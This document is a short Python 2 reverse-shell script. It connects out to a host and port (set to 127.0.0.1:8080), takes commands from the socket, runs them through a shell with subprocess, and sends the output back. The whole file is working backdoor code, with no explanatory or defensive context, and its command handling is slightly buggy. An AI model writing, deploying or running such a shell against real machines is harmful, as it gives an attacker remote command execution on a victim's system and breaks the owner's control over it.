#!/usr/bin/env python

import socket

import subprocess

host = "127.0.0.1"

port = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((host, port))

client.send("Connected! quite to exit!Command here: \r\n")

while 1:
    try:   
         data = client.recv(1024)
        
         if data == "quit": break
         if data =='\r':client.send(data)
         if data =='exit':client.send('\r')
         if 'cd..' in data :client.send('command not suport')  
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        
         stdoutput = proc.stdout.read()+proc.stderr.read()
         
         client.send(stdoutput)
         #print('test\r\n%s'%stdoutput)
    except KeyboardInterrupt:
        client.send("Bye!")
        client.close()
client.send("Bye!")

client.close()